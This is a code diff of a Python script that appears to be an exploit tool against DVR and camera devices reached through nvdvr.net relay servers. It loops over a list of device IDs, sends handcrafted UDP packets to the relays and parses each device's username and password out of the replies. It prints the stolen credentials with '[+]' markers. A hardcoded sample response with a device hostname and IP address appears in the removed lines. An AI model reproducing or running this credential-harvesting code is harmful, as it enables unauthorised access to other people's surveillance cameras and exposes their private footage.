@@ -12,22 +12,41 @@ class server:
     def __init__(self):
         self.CamList(self.FileListCams)
         try:
-            self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            for dev in self.CamsList:
-                self.CreateSocket(dev)
             while (True):
-                # result = (self.s.recvfrom(4096, 0))[0]
-                result = b'\xcf39097810.nvdvr.net\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00152.32.227.233\x00\x00\x02\xb6\xfe\x05\x00\x01\x00\x07\x00\x00\x00\x00\x00\x00\x00'
-                print(f'Received response from server: {self.byte2str(result)}')  # debugging
+                self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                if not bool(self.CamsList):
+                    break
+                for dev in self.CamsList:
+                    self.CreateSocket(dev)
+
+                result = (self.s.recvfrom(4096, 0))[0]
+                # print(f'Received response from server: {self.byte2str(result)}')  # debugging
                 result = self.ParseRelayServer(result)
-                print(result)
-                break
+                id_cam = self.ConnenctToRelay(result)
+                self.CamsList.remove(id_cam)
 
         except socket.error as e:
             print("socket creation failed with error %s" % (e))
 
-    def ConnenctToRelay(self):
-        pass
+    def ConnenctToRelay(self, d):
+        try:
+            data = '32'
+            data += bytes(d['id'], 'utf-8').hex()
+            data += '2e6e766476722e6e65740000000000000000000000000000302e302e302e30000000000000000000018a1bc4d62f4a41ae000000000000'
+            data = bytes.fromhex(data)
+            relay_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+            result = self.send_data(relay_s, data, d['relay_server'], d['relay_port'])
+            if result[0] == 0xa7:
+                # split out the username and password from the result
+                username = result[8:result.find(b'\x00', 8)].decode('utf-8')
+                password = result[0x3a:result.find(b'\x00', 0x3a)].decode('utf-8')
+                print(f'\u001b[32m[+] DeviceID: {d["id"]}')
+                print(f'[+] Username: {username}')
+                print(f'[+] Password: {password}\u001b[37m')
+                return d["id"]
+        except socket.error as e:
+            print("socket creation failed with error %s" % (e))
 
     def ParseRelayServer(self, data):
         try:
@@ -50,28 +69,27 @@ class server:
             print("Fiddlesticks! Failed")
 
     def CreateSocket(self, dev):
-        print("Socket successfully created")
+        print("\u001b[32m[+]Socket successfully created\u001b[37m")
         data = '02070032303038333131323334333734313100020c17222d0000'
         data += bytes(dev, 'utf-8').hex()
         data += '2e6e766476722e6e65740000000000000000000000000000'
         data += '3131313131313131313131318a1bc0a801096762230a93f5d100'
-        print(data)
         data = bytes.fromhex(data)
-        result = self.send_data(data)
-        print(f'Response from server: {self.byte2str(result)}')
+        result = self.send_data(self.s, data, self.SERVER, self.PORT)
+        # print(f'Response from server: {self.byte2str(result)}')
 
     @staticmethod
     def byte2str(s):
         return "".join(map(chr, s))
 
-    def send_data(self, data):
-        print(f'SERVER:{self.SERVER} PORT:{self.PORT}')
-        print(self.byte2str(data))
+    def send_data(self, s, data, serv, port):
+        print(f'\u001b[32m[+]SERVER:{serv} PORT:{port}\u001b[37m')
+        # print(self.byte2str(data))
         try:
-            self.s.sendto(data, (self.SERVER, self.PORT))
+            s.sendto(data, (serv, port))
         except socket.error as e:
             print("socket creation failed with error %s" % (e))
-        response = self.s.recvfrom(4096, 0)
+        response = s.recvfrom(4096, 0)
         return response[0]
 
     def __del__(self):
